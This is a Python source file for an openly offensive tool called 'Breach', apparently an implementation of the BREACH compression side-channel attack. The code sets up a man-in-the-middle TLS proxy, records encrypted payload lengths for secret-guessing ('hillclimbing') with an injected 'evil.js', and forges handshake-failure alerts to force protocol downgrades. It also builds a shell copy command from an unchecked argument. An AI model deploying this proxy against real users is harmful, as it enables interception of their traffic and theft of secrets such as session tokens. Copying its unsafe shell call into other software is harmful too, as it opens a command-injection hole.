import socket
import select
import logging
import binascii
from os import system, path
import sys
import signal
import constants

def signal_handler(signal, frame):
    '''
    Signal handler for killing the execution.
    '''
    print('Exiting the program per your command')
    b.stop()
    exit(0)
signal.signal(signal.SIGINT, signal_handler)

class Breach():
    '''
    Class that handles the network connection for breach.
    '''
    def __init__(self, args_dict):
        '''
        Initialize loggers and arguments dictionary.
        '''
        self.args_dict = args_dict
        if args_dict['verbose'] < 4:
            self.setup_logger('full', 'full_breach.log', logging.ERROR)
        else:
            self.setup_logger('full', 'full_breach.log')
        if args_dict['verbose'] < 3:
            self.setup_logger('basic', 'basic_breach.log', logging.ERROR)
        else:
            self.setup_logger('basic', 'basic_breach.log')
        if not 'debug_logger' in args_dict:
            if args_dict['verbose'] < 2:
                self.setup_logger('debug_logger', 'debug.log', logging.ERROR)
            else:
                self.setup_logger('debug_logger', 'debug.log')
            self.args_dict['debug_logger'] = logging.getLogger('debug_logger')
        self.full_logger = logging.getLogger('full')
        self.basic_logger = logging.getLogger('basic')
        return

    def setup_logger(self, logger_name, log_file, level=logging.DEBUG):
        '''
        Logger factory.
        '''
        l = logging.getLogger(logger_name)
        formatter = logging.Formatter('%(asctime)s : %(message)s')
        fileHandler = logging.FileHandler(log_file, mode='a')
        fileHandler.setFormatter(formatter)
        streamHandler = logging.StreamHandler()
        streamHandler.setFormatter(formatter)
        l.setLevel(level)
        l.addHandler(fileHandler)
        l.addHandler(streamHandler)
        return

    def log_data(self, data):
        '''
        Print hexadecimal and ASCII representation of data
        '''
        pad = 0
        output = []
        buff = '' # Buffer of 16 chars

        for i in xrange(0, len(data), constants.LOG_BUFFER):
                buff = data[i:i+constants.LOG_BUFFER]
                hex = binascii.hexlify(buff) # Hex representation of data
                pad = 32 - len(hex)
                txt = '' # ASCII representation of data
                for ch in buff:
                    if ord(ch)>126 or ord(ch)<33:
                            txt = txt + '.'
                    else:
                            txt = txt + chr(ord(ch))
                output.append('%2d\t %s%s\t %s' % (i, hex, pad*' ', txt))

        return '\n'.join(output)

    def parse(self, data, past_bytes_endpoint, past_bytes_user, chunked_endpoint_header, chunked_user_header, is_response = False):
        '''
        Parse data and print header information and payload.
        '''
        lg = ['\n']
        downgrade = False

        # Check for defragmentation between packets
        if is_response:
            # Check if TLS record header was chunked between packets and append it to the beginning
            if chunked_endpoint_header:
                data = chunked_endpoint_header + data
                chunked_endpoint_header = None
            # Check if there are any remaining bytes from previous record
            if past_bytes_endpoint:
                lg.append('Data from previous TLS record: Endpoint\n')
                if past_bytes_endpoint >= len(data):
                    lg.append(self.log_data(data))
                    lg.append('\n')
                    past_bytes_endpoint = past_bytes_endpoint - len(data)
                    return ('\n'.join(lg), past_bytes_endpoint, past_bytes_user, chunked_endpoint_header, chunked_user_header, downgrade)
                else:
                    lg.append(self.log_data(data[0:past_bytes_endpoint]))
                    lg.append('\n')
                    data = data[past_bytes_endpoint:]
                    past_bytes_endpoint = 0
        else:
            if chunked_user_header:
                data = chunked_user_header + data
                chunked_user_header = None
            if past_bytes_user:
               lg.append('Data from previous TLS record: User\n')
               if past_bytes_user >= len(data):
                   lg.append(self.log_data(data))
                   lg.append('\n')
                   past_bytes_user = past_bytes_user - len(data)
                   return ('\n'.join(lg), past_bytes_endpoint, past_bytes_user, chunked_endpoint_header, chunked_user_header, downgrade)
               else:
                   lg.append(self.log_data(data[0:past_bytes_user]))
                   lg.append('\n')
                   data = data[past_bytes_user:]
                   past_bytes_user = 0

        try:
            cont_type = ord(data[constants.TLS_CONTENT_TYPE])
            version = (ord(data[constants.TLS_VERSION_MAJOR]), ord(data[constants.TLS_VERSION_MINOR]))
            length = 256*ord(data[constants.TLS_LENGTH_MAJOR]) + ord(data[constants.TLS_LENGTH_MINOR])
        except Exception as exc:
            self.full_logger.debug('Only %d remaining for next record, TLS header gets chunked' % len(data))
            self.full_logger.debug(exc)
            if is_response:
                chunked_endpoint_header = data
            else:
                chunked_user_header = data
            return ('', past_bytes_endpoint, past_bytes_user, chunked_endpoint_header, chunked_user_header, downgrade)

        if is_response:
                if cont_type in constants.TLS_CONTENT:
                        self.basic_logger.debug('Endpoint %s Length: %d' % (constants.TLS_CONTENT[cont_type], length))
                        if cont_type == 23:
                                with open('out.out', 'a') as f:
                                    f.write('Endpoint application payload: %d\n' % length)
                                    f.close()
                else:
                        self.basic_logger.debug('Unassigned Content Type record (len = %d)' % len(data))
                lg.append('Source : Endpoint')
        else:
                if cont_type in constants.TLS_CONTENT:
                        self.basic_logger.debug('User %s Length: %d' % (constants.TLS_CONTENT[cont_type], length))
                        if cont_type == 22:
                                if ord(data[constants.MAX_TLS_POSITION]) > constants.MAX_TLS_ALLOWED:
                                    downgrade = True
                        if cont_type == 23:
                                with open('out.out', 'a') as f:
                                    f.write('User application payload: %d\n' % length)
                                    f.close()
                else:
                        self.basic_logger.debug('Unassigned Content Type record (len = %d)' % len(data))
                lg.append('Source : User')

        try:
            lg.append('Content Type : ' + constants.TLS_CONTENT[cont_type])
        except:
            lg.append('Content Type: Unassigned %d' % cont_type)
        try:
            lg.append('TLS Version : ' + constants.TLS_VERSION[(version[0], version[1])])
        except:
            lg.append('TLS Version: Uknown %d %d' % (version[0], version[1]))
        lg.append('TLS Payload Length: %d' % length)
        lg.append('(Remaining) Packet Data length: %d\n' % len(data))

        # Check if TLS record spans to next TCP segment
        if len(data) - constants.TLS_HEADER_LENGTH < length:
            if is_response:
                past_bytes_endpoint = length + constants.TLS_HEADER_LENGTH - len(data)
            else:
                past_bytes_user = length + constants.TLS_HEADER_LENGTH - len(data)

        lg.append(self.log_data(data[0:constants.TLS_HEADER_LENGTH]))
        lg.append(self.log_data(data[constants.TLS_HEADER_LENGTH:constants.TLS_HEADER_LENGTH+length]))
        lg.append('\n')

        # Check if packet has more than one TLS records
        if length < len(data) - constants.TLS_HEADER_LENGTH:
                more_records, past_bytes_endpoint, past_bytes_user, chunked_endpoint_header, chunked_user_header, _ = self.parse(
                                                                                                                                data[constants.TLS_HEADER_LENGTH+length:],
                                                                                                                                past_bytes_endpoint,
                                                                                                                                past_bytes_user,
                                                                                                                                chunked_endpoint_header,
                                                                                                                                chunked_user_header,
                                                                                                                                is_response
                                                                                                                                )
                lg.append(more_records)

        return ('\n'.join(lg), past_bytes_endpoint, past_bytes_user, chunked_endpoint_header, chunked_user_header, downgrade)

    def start(self):
        '''
        Start sockets on user side (proxy as server) and endpoint side (proxy as client).
        '''
        self.full_logger.info('Starting Proxy')

        try:
            self.user_setup()
            self.endpoint_setup()
        except:
            pass

        self.full_logger.info('Proxy is set up')
        return

    def restart(self, attempt_counter = 0):
        '''
        Restart sockets in case of error.
        '''
        self.full_logger.info('Restarting Proxy')

        try:
            self.user_socket.close()
            self.endpoint_socket.close()
        except:
            pass

        try:
            self.user_setup()
            self.endpoint_setup()
        except:
            if attempt_counter < 3:
                self.full_logger.debug('Reattempting restart')
                self.restart(attempt_counter+1)
            else:
                self.full_logger.debug('Multiple failed attempts to restart')
                self.stop(-9)
                sys.exit(-1)

        self.full_logger.info('Proxy has restarted')
        return

    def stop(self, exit_code = 0):
        '''
        Shutdown sockets and terminate connection.
        '''
        try:
            self.user_connection.close()
            self.endpoint_socket.close()
        except:
            pass
        self.full_logger.info('Connection closed')
        self.args_dict['debug_logger'].debug('Stopping breach object with code: %d\n' % exit_code)
        return

    def user_setup(self):
        '''
        Create and configure user side socket.
        '''
        try:
            self.full_logger.info('Setting up user socket')
            user_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            user_socket.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1) # Set options to reuse socket
            user_socket.bind((constants.USER, constants.USER_PORT))
            self.full_logger.info('User socket bind complete')
            user_socket.listen(1)
            self.full_logger.info('User socket listen complete')
            self.user_connection, self.address = user_socket.accept()
            self.user_socket = user_socket
            self.full_logger.info('User socket is set up')
        except:
            self.stop(-8)
            sys.exit(-1)
        return

    def endpoint_setup(self):
        '''
        Create and configure endpoint side socket
        '''
        try:
            self.full_logger.info('Setting up endpoint socket')
            endpoint_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            self.full_logger.info('Connecting endpoint socket')
            endpoint_socket.connect((constants.ENDPOINT, constants.ENDPOINT_PORT))
            endpoint_socket.setblocking(0) # Set non-blocking, i.e. raise exception if send/recv is not completed
            self.endpoint_socket = endpoint_socket
            self.full_logger.info('Endpoint socket is set up')
        except:
            self.stop(-7)
            sys.exit(-1)
        return

    def execute_breach(self):
        '''
        Start proxy and execute main loop
        '''
        # Initialize parameters for execution.
        past_bytes_user = 0 # Number of bytes expanding to future user packets
        past_bytes_endpoint = 0 # Number of bytes expanding to future endpoint packets
        chunked_user_header = None # TLS user header portion that gets stuck between packets
        chunked_endpoint_header = None # TLS endpoint header portion that gets stuck between packets

        self.start()
        self.full_logger.info('Starting main proxy loop')
        try:
            while 1:
                ready_to_read, ready_to_write, in_error = select.select(
                                                                        [self.user_connection, self.endpoint_socket],
                                                                        [],
                                                                        [],
                                                                        5
                                                                       )

                if self.user_connection in ready_to_read: # If user side socket is ready to read...
                        data = ''

                        try:
                            data = self.user_connection.recv(constants.SOCKET_BUFFER) # ...receive data from user...
                        except Exception as exc:
                            self.full_logger.debug('User connection error')
                            self.full_logger.debug(exc)
                            self.stop(-6)
                            break

                        if len(data) == 0:
                                self.full_logger.info('User connection closed')
                                self.stop(-5)
                        else:
                                self.basic_logger.debug('User Packet Length: %d' % len(data))
                                output, past_bytes_endpoint, past_bytes_user, chunked_endpoint_header, chunked_user_header, downgrade = self.parse(
                                                                                                                                                   data,
                                                                                                                                                   past_bytes_endpoint,
                                                                                                                                                   past_bytes_user,
                                                                                                                                                   chunked_endpoint_header,
                                                                                                                                                   chunked_user_header
                                                                                                                                                  ) # ...parse it...
                                self.full_logger.debug(output)
                                try:
                                    if downgrade and constants.ATTEMPT_DOWNGRADE:
                                            alert = 'HANDSHAKE_FAILURE'
                                            output, _, _, _, _, _ = self.parse(
                                                                               constants.ALERT_MESSAGES[alert],
                                                                               past_bytes_endpoint,
                                                                               past_bytes_user,
                                                                               True
                                                                              )
                                            self.full_logger.debug('\n\n' + 'Downgrade Attempt' + output)
                                            self.user_connection.sendall(constants.ALERT_MESSAGES[alert]) # if we are trying to downgrade, send fatal alert to user
                                            continue
                                    self.endpoint_socket.sendall(data) # ...and send it to endpoint
                                except Exception as exc:
                                    self.full_logger.debug('User data forwarding error')
                                    self.full_logger.debug(exc)
                                    self.stop(-4)
                                    break

                if self.endpoint_socket in ready_to_read: # Same for the endpoint side
                        data = ''

                        try:
                            data = self.endpoint_socket.recv(constants.SOCKET_BUFFER)
                        except Exception as exc:
                            self.full_logger.debug('Endpoint connection error')
                            self.full_logger.debug(exc)
                            self.stop(-3)
                            break

                        if len(data) == 0:
                                self.full_logger.info('Endpoint connection closed')
                                self.stop(5)
                                break
                        else:
                                self.basic_logger.debug('Endpoint Packet Length: %d' % len(data))
                                output, past_bytes_endpoint, past_bytes_user, chunked_endpoint_header, chunked_user_header, _ = self.parse(
                                                                                                                                           data,
                                                                                                                                           past_bytes_endpoint,
                                                                                                                                           past_bytes_user,
                                                                                                                                           chunked_endpoint_header,
                                                                                                                                           chunked_user_header,
                                                                                                                                           True
                                                                                                                                          )
                                self.full_logger.debug(output)
                                try:
                                    self.user_connection.sendall(data)
                                except Exception as exc:
                                    self.full_logger.debug('Endpoint data forwarding error')
                                    self.full_logger.debug(exc)
                                    self.stop(-2)
                                    break
        except Exception as e:
            self.stop(-1)
        return

def parse_args():
    '''
    Parse console arguments for standalone use.
    '''
    parser = argparse.ArgumentParser(description='Create hillclimbing parameters file')
    parser.add_argument('--silent', action = 'store_true', help = 'Enable silent execution.')
    parser.add_argument('-a', '--alpha_types', metavar = 'alphabet', required = True, nargs = '+', help = 'Choose alphabet type: n => digits, l => lowercase letters, u => uppercase letters, d => - and _')
    parser.add_argument('-p', '--prefix', metavar = 'bootstrap_prefix', required = True, help = 'Input the already known prefix needed for bootstrap')
    parser.add_argument('-m', '--method', metavar = 'request_method', help = 'Choose the request method: s => serial, p => parallel')
    parser.add_argument('--wdir', metavar = 'web_application_directory', help = 'The directory where you have added evil.js')
    parser.add_argument('--verbose', metavar = 'verbosity_level', type = int, help = 'Choose verbosity level: 0 => no logs, 1 => attack logs, 2 => debug logs, 3 => basic breach logs, 4 => full logs')
    args = parser.parse_args()

    args_dict = {}
    args_dict['silent'] = True if args.silent else False
    args_dict['alpha_types'] = args.alpha_types
    args_dict['prefix'] = args.prefix
    args_dict['method'] = args.method if args.method else 's'
    args_dict['wdir'] = args.wdir if args.wdir else '/var/www/breach'
    args_dict['verbose'] = args.verbose if args.verbose else 0
    return args_dict

if __name__ == '__main__':
    import argparse
    import hillclimbing

    global b

    args_dict = parse_args()
    hillclimbing.create_request_file(args_dict)
    system('cp request.txt ' + args_dict['wdir'])
    b = Breach(args_dict)
    b.full_logger.info('Hillclimbing parameters file created')
    b.execute_breach()
